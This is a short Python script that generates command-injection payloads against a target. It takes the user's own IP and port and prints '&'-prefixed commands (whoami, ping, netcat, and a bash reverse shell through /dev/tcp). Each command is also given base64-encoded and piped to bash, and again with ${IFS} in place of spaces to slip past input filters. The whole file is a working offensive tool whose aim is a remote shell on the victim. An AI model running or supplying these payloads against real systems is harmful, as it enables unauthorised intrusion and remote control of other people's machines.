import base64 

host_ip = input("Enter you Device IP(HOST IP): ")
port_value = input("Enter custom port else 4444 will be default: ")
port = port_value if port_value != "" else str("4444")
payloads = ["&whoami",
"&ping {host_ip}",
"&nc {host_ip} {port}",
"&netcat {host_ip} {port}",
"&/usr/bin/bash -i >& /dev/tcp/{host_ip}/{port} 0>&1"]
for payload in payloads:
    print(payload.replace("{host_ip}", host_ip).replace("{port}", port))
    print("& echo '"+(base64.b64encode(payload[1:].replace("{host_ip}", host_ip).replace("{port}", port).encode('UTF-8')).decode('UTF-8')+"'|base64 -d|/usr/bin/bash"))   
    print(("& echo '"+(base64.b64encode(payload[1:].replace("{host_ip}", host_ip).replace("{port}", port).encode('UTF-8'))).decode('UTF-8')+"'|base64 -d|/usr/bin/bash").replace(" ", "${IFS}"))

# encoded_1 = (f"/usr/bin/bash -i >& /dev/tcp/{host_ip}/{port} 0>&1").encode("UTF-8")
# print("& echo '"+(base64.b64encode(encoded_1)).decode('UTF-8')+"'|base64 -d|/usr/bin/bash")
# encoded_2 = ("echo '"+(base64.b64encode(encoded_1)).decode('UTF-8')+"'|base64 -d|/usr/bin/bash").replace(" ", "${IFS}")
# print(encoded_2)
